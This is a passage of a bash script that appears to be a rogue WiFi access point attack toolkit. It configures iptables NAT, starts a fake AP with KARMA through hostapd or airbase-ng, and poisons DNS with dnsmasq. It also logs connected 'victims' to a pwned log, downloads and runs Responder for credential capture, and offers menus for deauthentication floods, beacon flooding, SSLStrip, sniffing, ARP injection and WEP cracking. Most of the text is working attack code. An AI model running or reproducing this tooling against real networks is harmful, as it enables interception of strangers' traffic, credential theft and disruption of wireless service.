iptables --table filter --append syn_flood --jump RETURN -p tcp --syn -m limit --limit 25/second --limit-burst 50
iptables --table filter --append syn_flood --jump DROP
}
function fw_zones(){
echo "  Loading Input..."
iptables --table filter --append INPUT --jump ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
iptables --table filter --append INPUT --jump DROP -m conntrack --ctstate INVALID
iptables --table filter --append INPUT --jump ACCEPT -i lo
iptables --table filter --append INPUT --jump syn_flood -p tcp --syn
iptables --table filter --append INPUT --jump input_rule
iptables --table filter --append INPUT --jump input
iptables --table filter -P INPUT ACCEPT
echo "  Loading Output..."
iptables --table filter --append OUTPUT --jump ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
iptables --table filter --append OUTPUT --jump DROP -m conntrack --ctstate INVALID
iptables --table filter --append OUTPUT --jump ACCEPT -o lo
iptables --table filter --append OUTPUT --jump output_rule
iptables --table filter --append OUTPUT --jump output
iptables --table filter -P OUTPUT ACCEPT
echo "  Loading Forward..."
iptables --table filter --append FORWARD --jump ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
iptables --table filter --append FORWARD --jump DROP -m conntrack --ctstate INVALID
iptables --table filter --append FORWARD --jump forwarding_rule
iptables --table filter --append FORWARD --jump forward
iptables --table filter -P FORWARD ACCEPT
}
function fw_rules(){
iptables --table filter --append reject --jump REJECT --reject-with tcp-reset -p tcp
iptables --table filter --append reject --jump REJECT --reject-with port-unreach
iptables --table filter --append zone_lan --jump zone_lan_ACCEPT
iptables --table filter --insert zone_lan 1 --jump input_lan
iptables --table filter --append zone_lan_forward --jump zone_lan_ACCEPT
iptables --table filter --insert zone_lan_forward 1 --jump forwarding_lan
iptables --table filter --append output --jump zone_lan_ACCEPT
iptables --table nat --append PREROUTING --jump prerouting_rule
iptables --table nat --append POSTROUTING --jump postrouting_rule
iptables --table nat --insert zone_lan_prerouting 1 --jump prerouting_lan
}
###############################
# NETWORK ADDRESS TRANSLATION #
###############################
function fw_interfaces(){
iptables --table filter --append FORWARD --jump ACCEPT -i $BRLANIFACE
iptables --table filter --append zone_lan_ACCEPT --jump ACCEPT -o $BRLANIFACE
iptables --table filter --append zone_lan_ACCEPT --jump ACCEPT -i $BRLANIFACE
iptables --table filter --append zone_lan_DROP --jump DROP -o $BRLANIFACE
iptables --table filter --append zone_lan_DROP --jump DROP -i $BRLANIFACE
iptables --table filter --append zone_lan_REJECT --jump reject -o $BRLANIFACE
iptables --table filter --append zone_lan_REJECT --jump reject -i $BRLANIFACE
iptables --table filter --append input --jump zone_lan -i $BRLANIFACE
iptables --table filter --append forward --jump zone_lan_forward -i $BRLANIFACE
iptables --table nat --append PREROUTING --jump zone_lan_prerouting -i $BRLANIFACE
iptables --table raw --append PREROUTING --jump zone_lan_notrack -i $BRLANIFACE
iptables --table nat --append POSTROUTING --jump zone_lan_nat -o $BRLANIFACE
}
function fw_wan(){
iptables --table filter --append zone_wan --jump zone_wan_ACCEPT
iptables --table filter --insert zone_wan 1 --jump input_wan
iptables --table filter --insert zone_wan 1 --jump ACCEPT -p udp --dport 68
iptables --table filter --insert zone_wan 2 --jump ACCEPT -p icmp
iptables --table filter --append zone_wan_forward --jump zone_wan_ACCEPT
iptables --table filter --insert zone_wan_forward 1 --jump forwarding_wan
iptables --table filter --insert zone_wan_forward 1 --jump zone_lan_ACCEPT
iptables --table filter --insert zone_wan_forward 1 --jump DROP -p tcp
iptables --table nat --append zone_wan_nat --jump MASQUERADE -s 0.0.0.0/0 -d 0.0.0.0/0
iptables --table nat --insert zone_wan_prerouting 1 --jump prerouting_wan
iptables --table filter --append output --jump zone_wan_ACCEPT
iptables --table mangle --append FORWARD --jump zone_wan_MSSFIX
iptables --table mangle --append zone_wan_MSSFIX --jump TCPMSS -o $WANIFACE -p tcp --tcp-flags SYN,RST SYN --clamp-mss-to-pmtu
iptables --table mangle --append PREROUTING -i $BRLANIFACE -p tcp --dport 80 --jump internet
iptables --table mangle --append internet --jump MARK --set-mark 99
iptables --table filter --append zone_wan_ACCEPT --jump ACCEPT -o $WANIFACE
iptables --table filter --append zone_wan_ACCEPT --jump ACCEPT -i $WANIFACE
iptables --table filter --append zone_wan_DROP --jump DROP -o $WANIFACE
iptables --table filter --append zone_wan_DROP --jump DROP -i $WANIFACE
iptables --table filter --append zone_wan_REJECT --jump reject -o $WANIFACE
iptables --table filter --append zone_wan_REJECT --jump reject -i $WANIFACE
iptables --table filter --append input --jump zone_wan -i $WANIFACE
iptables --table filter --append forward --jump zone_wan_forward -i $WANIFACE
iptables --table filter -t nat --append PREROUTING --jump zone_wan_prerouting -i $WANIFACE
iptables --table filter -t raw --append PREROUTING --jump zone_wan_notrack -i $WANIFACE
iptables --table filter -t nat --append POSTROUTING --jump zone_wan_nat -o $WANIFACE
}
function fw_listeningports(){
netstat -npltw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listentcp.txt
netstat -npluw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listenudp.txt
}
function fw_natreflection(){
fw_listeningports
iptables --table nat --append prerouting_rule --jump nat_reflection_in
iptables --table nat --append postrouting_rule --jump nat_reflection_out
iptables --table filter --append forwarding_rule --jump nat_reflection_fwd
for TCPPORT in `grep -v N $sessionfolder/logs/listentcp.txt`; do
iptables --table nat --append nat_reflection_in -s $TAPIP/16 -d $WANIP -p tcp --dport $TCPPORT --jump DNAT --to $TAPIP:$TCPPORT;
iptables --table nat --append nat_reflection_out -s $TAPIP/16 -d $TAPIP -p tcp --dport $TCPPORT --jump SNAT --to-source $TAPIP;
iptables --table filter --append nat_reflection_fwd -s $TAPIP/16 -d $TAPIP -p tcp --dport $TCPPORT --jump ACCEPT;
done
for UDPPORT in `grep -v N $sessionfolder/logs/listenudp.txt`; do
iptables --table nat --append nat_reflection_in -s $TAPIP/16 -d $WANIP -p udp --dport $UDPPORT --jump DNAT --to $TAPIP:$UDPPORT;
iptables --table nat --append nat_reflection_out -s $TAPIP/16 -d $TAPIP -p udp --dport $UDPPORT --jump SNAT --to-source $TAPIP;
iptables --table filter --append nat_reflection_fwd -s $TAPIP/16 -d $TAPIP -p udp --dport $UDPPORT --jump ACCEPT;
done
}
function fw_lan_rules(){
fw_listeningports
for TCPPORT in `grep -v N $sessionfolder/logs/listentcp.txt`; do
iptables --table nat --append zone_lan_prerouting --jump DNAT -d $TAPIP/32 -p tcp --dport $TCPPORT --to-destination $TAPIP:$TCPPORT;
iptables --table filter --append zone_lan_forward --jump ACCEPT -d $TAPIP/32 -p tcp --dport $TCPPORT;
done
for UDPPORT in `grep -v N $sessionfolder/logs/listenudp.txt`; do
iptables --table nat --append zone_lan_prerouting --jump DNAT -d $TAPIP/32 -p tcp --dport $UDPPORT --to-destination $TAPIP:$UDPPORT;
iptables --table filter --append zone_lan_forward --jump ACCEPT -d $TAPIP/32 -p tcp --dport $UDPPORT;
done
iptables --table nat --append zone_lan_prerouting --jump DNAT -d $TAPIP/32 -p tcp --dport 1:65535 --to-destination $TAPIP:23;
}
function fw_wan_rules(){
fw_listeningports
for TCPPORT in `grep -v N $sessionfolder/logs/listentcp.txt`; do
iptables --table nat --append zone_wan_prerouting --jump DNAT -d $WANIP/32 -p tcp --dport $TCPPORT --to-destination $TAPIP:$TCPPORT;
iptables --table filter --append zone_wan_forward --jump ACCEPT -d $TAPIP/32 -p tcp --dport $TCPPORT;
done
for UDPPORT in `grep -v N $sessionfolder/logs/listenudp.txt`; do
iptables --table nat --append zone_wan_prerouting --jump DNAT -d $WANIP/32 -p tcp --dport $UDPPORT --to-destination $TAPIP:$UDPPORT;
iptables --table filter --append zone_wan_forward --jump ACCEPT -d $TAPIP/32 -p tcp --dport $UDPPORT;
done
}
function fw_logs(){
iptables --table filter --append logaccept -m limit --limit 2/m --jump LOG --log-prefix "LOGACCEPT: "
iptables --table filter --append logaccept --jump ACCEPT
iptables --table filter --append logbrute -m limit --limit 5/m --jump LOG --log-prefix "LOGBRUTE: "
iptables --table filter --append logbrute --jump DROP
iptables --table filter --append logdrop -m limit --limit 5/m --jump LOG --log-prefix "LOGDROP: "
iptables --table filter --append logdrop --jump DROP
iptables --table filter --append logreject -m limit --limit 5/m --jump LOG --log-prefix "LOGREJECT: "
iptables --table filter --append logreject --jump REJECT -p tcp --reject-with tcp-reset
iptables --table filter --append logreject --jump DROP
}
function fw_custom(){
# iptables --table filter --append INPUT -i $WANIFACE -p tcp --dport 22 --jump logbrute
iptables --table filter --append INPUT -p tcp -d $TAPIP --dport 22 --jump logaccept
# iptables --table filter --append INPUT -i $WANIFACE -p icmp --jump ACCEPT
# iptables --table filter --append INPUT -i lo -m state --state NEW --jump ACCEPT
iptables --table filter --append INPUT -i $TAPIFACE -m state --state NEW --jump logaccept
iptables --table filter --append INPUT -i eth0 -m state --state NEW --jump logaccept
iptables --table filter --append INPUT --jump logdrop
iptables --table filter --append OUTPUT -o $TAPIFACE --jump logaccept
# iptables --table filter --append FORWARD -o $WANIFACE -s $NETWORK --jump logaccept
iptables --table filter --append FORWARD -i $TAPIFACE --jump logaccept
iptables --table filter --append FORWARD -i $TAPIFACE -o $TAPIFACE --jump logaccept
# iptables --table filter --append FORWARD --jump victim2wan
iptables --table filter --append FORWARD -m state --state RELATED,ESTABLISHED --jump logaccept
# iptables --table filter --append FORWARD -i $TAPIFACE -o $WANIFACE --jump logaccept
iptables --table filter --append FORWARD -o $TAPIFACE -d $TAPIP --jump logaccept
iptables --table filter --append FORWARD -i $TAPIFACE -m state --state NEW --jump logaccept
iptables --table filter --append FORWARD --jump logdrop
iptables --table nat --append PREROUTING -i $TAPIFACE -p tcp -m mark --mark 99 -m tcp --dport 80 --jump DNAT --to $TAPIP
iptables --table nat --append POSTROUTING -o $TAPIFACE -s $NETOWRK -d $NETWORK --jump MASQUERADE
}
#####################
# STARTING SERVICES #
#####################
function starthostapd(){
echo "* STARTING SERVICE: HOSTAPD *"
hostapd -dd -f $sessionfolder/logs/hostapd.log -P $sessionfolder/pids/hostapd.pid $sessionfolder/config/hostapd.conf -B
sleep 7
}
function startairbase(){
modprobe tun
sleep 2
echo "* STARTING SERVICE: AIRBASE-NG *";
airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT -e $ESSID $MONIFACE -v > $sessionfolder/logs/airbaseng.log &
sleep 4
}
function startkarmaairbase(){
modprobe tun
sleep 2
echo "* STARTING SERVICE: KARMA AIRBASE-NG *";
airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT -e $ESSID $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
sleep 4
}
function startdnsmasq(){
echo "no-poll" >> $dnsmasqconf
echo "no-resolv" >> $dnsmasqconf
echo "* DNSMASQ DNS POISON!!! *"
TERMTITLE="DNSMASQ-POISON"
TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
STARTTERM
tail -F $sessionfolder/logs/dnsmasq.log | awk '/DHCPACK/ && /'$BRLANIFACE'/ {printf ("TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n"), $3, $8, $7, $9; fflush(stdout)}' >> $sessionfolder/logs/pwned.log &
}
function startdnsmasqresolv(){
echo "dhcp-option=wirelesslan,6,8.8.8.8,$TAPIP" >> $dnsmasqconf
echo "* DNSMASQ With Internet *"
TERMTITLE="DNSMASQ-INTERNET"
TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
STARTTERM
tail -F $sessionfolder/logs/dnsmasq.log | awk '/DHCPACK/ && /'$BRLANIFACE'/ {printf ("TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n"), $3, $8, $7, $9; fflush(stdout)}' >> $sessionfolder/logs/pwned.log &
}
function dhcpdserver(){
TERMTITLE="DHCP SERVER"
TERMCMD="dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
STARTTERM
}
function nodhcpserver(){
echo "* Not Using A Local DHCP Server *"
}
function apachesetup(){
APACHECONF=/etc/apache2
sed -n "s/AllowOverride None/AllowOverride All/g" $APACHECONF/apache2.conf
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
ln -s /var/log/apache2/access.log $sessionfolder/logs/access.log
ln -s /var/log/apache2/error.log $sessionfolder/logs/error.log
}
function apachecheck(){
apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
if [[ -z $apache ]]; then
echo "* Starting Apache2 Web Server *"
/etc/init.d/apache2 start
sleep 2
apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
if [[ -z $apache ]]; then
echo "* Apache Failed To Start Skipping... *"
sleep 4
else
echo "* Apache2 Web Server Started *"
fi
else
echo "Apache2 Was Already Running"
fi
}
function responder(){
wget -a $sessionfolder/logs/wget.log -t 3 -T 10 -O /tmp/responder.zip https://github.com/SpiderLabs/Responder/archive/master.zip
rm -rf /tmp/Responder-master
unzip -q /tmp/responder.zip -d /tmp
TERMTITLE="Python Responder"
TERMCMD="python /tmp/Responder-master/Responder.py -i 0.0.0.0 --basic=1 --http=Off --ssl=Off --sql=Off --dns=Off"
STARTTERM
}
#############################
# SHELL SCRIPT VERBOSE MODE #
#############################
function taillogshostapd(){
# for (i=9; i<=NF; i++)
echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
#echo "cur_time=$(awk '// {print $4}' < <(date))" >> $folder/probe.sh
echo "awk '/Probe/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", datestr, \$5, \$8, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -F $sessionfolder/logs/hostapd.log)" >> $folder/probe.sh
echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
echo "awk '/AP-STA-CONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -F $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
echo "tail -F $sessionfolder/logs/pwned.log" >> $folder/pwned.sh
echo "awk '/AP-STA-DISCONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: DISCONNECTED  | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -F $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $folder/access.log)" >> $folder/web.sh
echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $sessionfolder/logs/access.log)" >> $folder/web.sh
chmod a+x $folder/probe.sh
chmod a+x $folder/pwned.sh
chmod a+x $folder/web.sh
TERMTITLE="HTTP SERVER"
TERMCMD="/bin/bash $folder/web.sh"
STARTTERM
TERMTITLE="PROBE REQUESTS"
TERMCMD="/bin/bash $folder/probe.sh"
STARTTERM
TERMTITLE="PWNED"
TERMCMD="/bin/bash $folder/pwned.sh"
STARTTERM
#VICTIMMAC=awk '{printf("$2")}' < <(`tail -F dnsmasq.leases`)
#VICTIMIP=
#VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
#$TERM -e \
#"tail -F $sessionfolder/error.log"
}
function taillogsairbase(){
# for (i=9; i<=NF; i++)
echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -F $sessionfolder/logs/airbaseng.log)" >> $folder/probe.sh
echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -F $sessionfolder/logs/airbaseng.log) &" >> $folder/pwned.sh
echo "tail -F $sessionfolder/logs/pwned.log" >> $folder/pwned.sh
echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $folder/access.log)" >> $folder/web.sh
echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $sessionfolder/logs/access.log)" >> $folder/web.sh
chmod a+x $folder/probe.sh
chmod a+x $folder/pwned.sh
chmod a+x $folder/web.sh
TERMTITLE="HTTP SERVER"
TERMCMD="/bin/bash $folder/web.sh"
STARTTERM
TERMTITLE="PROBE REQUESTS"
TERMCMD="/bin/bash $folder/probe.sh"
STARTTERM
TERMTITLE="PWNED"
TERMCMD="/bin/bash $folder/pwned.sh"
STARTTERM
#VICTIMMAC=awk '{printf("$2")}' < <(`tail -F dnsmasq.leases`)
#VICTIMIP=
#VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
#$TERM -e \
#"tail -F $sessionfolder/error.log"
}
##########################
# INTERFACE PREP SECTION #
##########################
function brlan(){
brctl addbr $BRLANIFACE
ifconfig $TAPIFACE 0.0.0.0 promisc
echo "* ATTEMPTING TO BRIDGE ON $TAPIFACE (br-lan) *"
brctl addif $BRLANIFACE $TAPIFACE
ifconfig $BRLANIFACE $TAPIP netmask $NETMASK up;
route add -net $TAPIPBLOCK netmask $NETMASK gw $TAPIP;
BRLAN=up
}
function brlan_addwan(){
dhclient -4 -d $WANIFACE &>$sessionfolder/logs/bridge.log
BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $sessionfolder/logs/bridge.log))
while [ "$BRLANDHCP" = "No" ]; do
echo ""
echo "* [$FAIL] No DHCP Server Found On $WANIFACE *"
rm $sessionfolder/logs/bridge.log
done
pinggateway
}
function brlandown(){
ifconfig $BRLANIFACE down
brctl delif $BRLANIFACE $TAPIFACE
brctl delbr $BRLANIFACE
BRLAN=down
}
function monitormodestop(){
echo "* ATTEMPTING TO STOP MONITOR-MODE *"
if [ "$ATHIFACE" = "" ]; then 
ATHIFACE=`ifconfig wlan | awk '/encap/ {print $1}'`
fi
if [ "$MONIFACE" = "" ]; then
MONIFACE=mon0
fi
airmon-ng stop $ATHIFACE &>/dev/null;
airmon-ng stop $MONIFACE &>/dev/null;
ifconfig $ATHIFACE down
sleep 2
}
function monitormodestart(){
airmon-ng check kill > $sessionfolder/logs/monitormodepslist.log
echo "* ATTEMPTING TO START MONITOR-MODE ($ATHIFACE) *"
airmon-ng start $ATHIFACE $CHAN > $sessionfolder/logs/monitormode.log
MONIFACE=`awk '/enabled/ { print $5 }' $sessionfolder/logs/monitormode.log | head -c -2`
if [ "$SPOOFMAC" != "" ]; then
macchanger -m $SPOOFMAC $MONIFACE
fi
if [ "$MONIFACE" != "" ]; then
echo ""
echo "* [$OK] MONITOR MODE ENABLED ON ($MONIFACE) *"
echo "";
else
echo ""
echo "* [$FAIL] COULD NOT ENABLE MONITOR MODE ON ($ATHIFACE) *"
echo "IF YOU THINK THIS IS AN ERROR PLEASE REPORT IT TO"
echo "THE SCRIPT AUTHOR OR CHECK IF YOUR CARD IS SUPPORTED"
echo ""
sleep 9999; fi
}
######################
# SHELL SCRIPT MENUS #
######################
function internetmenu(){
echo "+-----------------------------------------------------+"
echo "| Internet Detected :-)                               |"
echo "+-----------------------------------------------------+"
echo "| 1) Install Any Missing Depends                       "
echo "| 2) Check For Updated Depends                         "
echo "| 3) Force Update This Script                          "
echo "| 4) Run The Damn Script Already                       "
echo "+-----------------------------------------------------+"
echo ""
read -e -p "$userprompt" internetmenu
echo ""
if [ "$internetmenu" = "" ]; then clear; internetmenu; fi
}
function runscript(){
echo "Running Script...."
}
function poisonmenu(){
banner
echo "+-----------------------------------------------------+"
echo "| Choose You're Poison?                               |"
echo "+-----------------------------------------------------+"
echo "| 1) Attack Mode | *DEFAULT*                           "
echo "| 2) Internet Mode | Man In The Middle                 "
echo "| 3) WEP/WPA/WPA2 Hack | Tons Of Cracking Utils        "
echo "| 4) Beacon Flood | Fake Access Point Flood            "
echo "| 5) Deauth Mode | Boot People Off                     "
echo "| **************************************************** "
echo "|     PRESS (CTRL + C) TO QUIT AT ANYTIME              "
echo "+-----------------------------------------------------+"
echo ""
read -e -p "$userprompt" mode
echo ""
if [ "$mode" = "" ]; then clear; poisonmenu; fi
}
function softapmenu(){
banner
echo "+-----------------------------------------------------+"
echo "| Which AP Software?                                  |"
echo "+-----------------------------------------------------+"
echo "| 1) HOSTAPD wITH KARMA                                "
echo "| 2) HOSTAPD NO KARMA                                  "
echo "| 3) Airbase-NG WITH KARMA                             "
echo "| 4) Airbase-NG NO KARMA                               "
echo "+-----------------------------------------------------+"
echo ""
read -e -p "$userprompt" softap
echo ""
if [ "$softap" = "" ]; then clear; softapmenu; fi
}
function dhcpmenu(){
banner
echo "+-----------------------------------------------------+"
echo "| Which DHCP SERVER?                                  |"
echo "+-----------------------------------------------------+"
echo "| 1) DNSMASQ | Does Both DHCP And DNS                  "
echo "| 2) DHCPD3-SERVER | Debian Distros                    "
echo "| 3) UDHCPD | Busybox Lightweight Server               "
echo "| 4) NONE | Use For MITM Or Custom Server              "
echo "+-----------------------------------------------------+"
echo ""
read -e -p "$userprompt" DHCPSERVER
echo ""
if [ "$DHCPSERVER" = "" ]; then clear; dhcpmenu; fi
}
function attackmenu(){
banner
echo "+-----------------------------------------------------+"
echo "| 1) Deauth"
echo "| 2) Wireshark"
echo "| 3) DSniff"
echo "| 4) URLSnarf"
echo "| 5) Driftnet"
echo "| 6) SSLStrip"
echo "| 7) Beacon Flood (WIFI JAMMER)"
echo "| 8) Restart Firewall"
echo "| 9) Exit and leave everything running"
echo "| 10) Exit and cleanup"
echo "+-----------------------------------------------------+"
echo ""
read -e -p "$userprompt" attack
if [ "$attack" = "" ]; then clear; attackmenu; fi
}
###################
# DEAUTH GOODNESS #
###################
function deauth(){
COUNT=999
echo ""
echo "+===================================+"
echo "| SCANNING NEARBY WIFIS             |"
echo "+===================================+"
#iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $sessionfolder/logs/scannedwifimaclist.txt
echo "a/$ATHIFACEMAC|any" > $sessionfolder/logs/droprules.txt
echo "d/any|any" >> $sessionfolder/logs/droprules.txt
echo "$ATHIFACEMAC" > $sessionfolder/logs/whitelist.txt
#isempty=$(ls -l $sessionfolder/logs | awk '/scannedwifimaclist.txt/ {print $5}')
echo ""
echo "+===================================+"
echo "| DEAUTH PEOPLE                      "
echo "+===================================+"
echo "| 1) MDK3 | Murder Death Kill III    "
echo "| 2) AIREPLAY-NG | Aircrack-NG Suite "
echo "| 3) AIRODROP-NG | Aircrack-NG Suite "
echo "+===================================+"
echo ""
read -e -p "$userprompt" DEAUTHPROG
if [ "$DEAUTHPROG" = "1" ]; then
DEAUTHPROG=mdk3
STARTTERM
$TERM -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/logs/whitelist.txt"
fi
if [ "$DEAUTHPROG" = "3" ]; then
DEAUTHPROG=airdrop-ng
TERMTITLE=""
STARTTERM
$TERM -e \
"airodump-ng --output-format csv --write $sessionfolder/pcap/dump.csv $MONIFACE"
unset TERMTITLE
sleep 5
if [ -f != /usr/sbin/airdrop-ng ]; then
ln -s /pentest/wireless/airdrop-ng/airdrop-ng /usr/sbin/airdrop-ng
fi
TERMTITLE=""
STARTTERM
$TERM -e \
"airdrop-ng -i $MONIFACE -t $sessionfolder/pcap/dump.csv-01.csv -r $sessionfolder/logs/droprules.txt"
unset TERMTITLE
fi
if [ "$DEAUTHPROG" = "2" ]; then
DEAUTHPROG=aireplay-ng
echo ""
echo "+===================================+"
echo "| 1) ESSID | ACCESSPOINT NAME        "
echo "| 2) APMAC | MAC ADDRESS OF AP       "
echo "| 3) CLIEN | ATTACK CLIENT           "
echo "+===================================+"
echo ""
read -e -p "$userprompt" DEAUTHMODE
if [ "$DEAUTHMODE" = "1" ]; then
$TERM -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"; fi
if [ "$DEAUTHMODE" = "2" ]; then
echo ""
echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
read -e -p "What Is The APs MAC ADDRESS? " APMAC
$TERM -e "aireplay-ng -0 $COUNT -a $APMAC $MONIFACE"; fi
if [ "$DEAUTHMODE" = "3" ]; then
echo ""
echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
read -e -p "What Is The APs MAC ADDRESS? " APMAC
read -e -p "What Is The CLIENTs MAC ADDRESS? " CLIENTMAC
$TERM -e "aireplay-ng -0 $COUNT -a $APMAC -c $CLIENTMAC $MONIFACE"; fi
fi
sleep $COUNT
killall -q -9 $DEAUTHPROG
echo ""
attackmenu
}
function beaconflood(){
read -e -p "how many fake aps would you like? (max 30) " end
if [ "$end" -gt "30" ]; then beaconflood; fi
read -e -p "use wordlist file? (type yes) " yesno
if [ "$yesno" = "yes" ]; then
read -e -p "wordlist File? " file
else
read -e -p "what essid? " essid
fi
startmonitormode
start=0
while [ $start -lt $end ]; do
if [ "$yesno" = "yes" ]; then
essid=`lc="$(($RANDOM % $(wc -l $file|awk '{print $1}')))"; sed -n "${lc}p" $file`
sleep 2
fi
mdk3 $iface b -c $chan -n "$essid$RANDOM" &
let start=start+1
done
sleep 999
killall mdk3
attackmenu
}
########################
# CHECK BATTERY LEVELS #
########################
function battery(){
BATTERY=/proc/acpi/battery/BAT0

REM_CAP=`grep "^remaining capacity" $BATTERY/state | awk '{ print $3 }'`
FULL_CAP=`grep "^last full capacity" $BATTERY/info | awk '{ print $4 }'`
BATSTATE=`grep "^charging state" $BATTERY/state | awk '{ print $3 }'`

CHARGE=`echo $(( $REM_CAP * 100 / $FULL_CAP ))`

NON='\033[00m'
BLD='\033[01m'
RED='\033[01;31m'
GRN='\033[01;32m'
YEL='\033[01;33m'

COLOUR="$RED"

case "${BATSTATE}" in
   'charged')
   BATSTT="$BLD=$NON"
   ;;
   'charging')
   BATSTT="$BLD+$NON"
   ;;
   'discharging')
   BATSTT="$BLD-$NON"
   ;;
esac

if [ "$CHARGE" -gt "99" ]
then
   CHARGE=100
fi

if [ "$CHARGE" -gt "15" ]
then
   COLOUR="$YEL"
fi

if [ "$CHARGE" -gt "30" ]
then
   COLOUR="$GRN"
fi

echo $CHARGE
}
# +===================================+
# | ANYTHING UNDER THIS IS UNTESTED   |
# | AND CAN BE USED FOR WEP CRACKING  |
# +===================================+
function capture(){
echo "+===================================+"
echo "| Capturing IVs For $ESSID          |"
echo "+===================================+"
gnome-terminal --geometry=130x15 --hide-menubar --title=CAPTURE-"$ESSID" -e \
"airodump-ng -c $CHAN --bssid $BSSID -w $folder/haxor.cap $MONIFACE"
sleep 5
}
function associate(){
echo "+===================================+"
echo "| Trying To Join ESSID: $ESSID"
echo "+===================================+"
gnome-terminal --geometry=130x15 --hide-menubar --title=JOIN-"$ESSID" -e \
"aireplay-ng -1 0 -e \"$ESSID\" -a \"$BSSID\" -h \"$TARGETMAC\" \"$MONIFACE\" &>/dev/null &"
}
function injectarpclientless(){
echo "+===================================+";
echo "Injecting ARP packets into "$ESSID"";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -3 -b "$BSSID" -h "$MAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function injectarpclient(){
echo "+===================================+";
echo "Injecting Client ARP packets into "$ESSID"";
#xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
#aireplay-ng -2 -b "$BSSID" -d FF:FF:FF:FF:FF:FF -m 68 -n 86 -t 1 -f 1 "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -3 -b "$BSSID" -h "$CLIENTMAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function randomarpclientless(){
echo "+===================================+";
echo "Injecting a random ARP packet into "$ESSID"";
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "$BSSID" -h "$MAC" -r replay*.cap "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -m 68 -n 86 -b "$BSSID" -c FF:FF:FF:FF:FF:FF -h "$MAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function randomarpclient(){
echo "+===================================+";
echo "Injecting a random ARP packet into "$ESSID"";
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "$BSSID" -h "$CLIENTMAC" -r replay*.cap "$MIFACE" &>/dev/null &
